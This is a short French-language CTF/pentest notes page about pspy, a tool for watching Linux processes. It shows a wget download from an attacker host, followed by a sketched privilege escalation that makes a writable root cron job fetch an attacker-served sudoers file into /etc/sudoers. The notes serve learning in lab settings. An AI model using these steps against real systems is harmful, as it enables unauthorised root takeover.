<sub>[Procédure serveur](server_procedure.md)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;[Cryptage](cryptage.md)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;[Outils](tools.md)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;[Sites utiles](useful_website.md)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;[Lexique](lexique.md)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;[Index](index.md)</sub>
<sub>[Retour](linux.md)</sub>
#pspy : Unprivileged Linux process snooping

**Présentation :** pspy is a command line tool designed to snoop on processes without need for root permissions. It allows you to see commands run by other users, cron jobs, etc. as they execute. Great for enumeration of Linux systems in CTFs. Also great to demonstrate your colleagues why passing secrets as arguments on the command line is a bad idea.

**Help :**
- https://github.com/DominicBreuker/pspy

**Procédure :**

- télécharger directement les binaires depuis son serveur. ex => *wget **LHOST**:**LPORT**/pspy64*
- se donner les droits de l'exécuter : *chmod +x pspy64*
- l'exécuter : *./pspy64*
- plus qu à attendre pour voir les process en cours qui tournent
  - Si un job tourne régulièrement 
    - exemple : https://hipotermia.pw/htb/curling
    - si un job tourne et qu on peut modifier le job... surtout si le job est executé comme root !
      - exemple : 
        -  je créé un fichier sur mon pc : ex my_sudoers
            <code> root	ALL=(ALL:ALL) ALL
            *USER_USED*	ALL=(ALL:ALL) ALL</code>
        - je prépare mon serveur pour le déposer
        - je modifie le job pour modifier le fichier sudoers et me donner les droits root. ex : *url = "http://**MON_IP**/**FILE_NAME**:**PORT**"\noutput = "/etc/sudoers"*
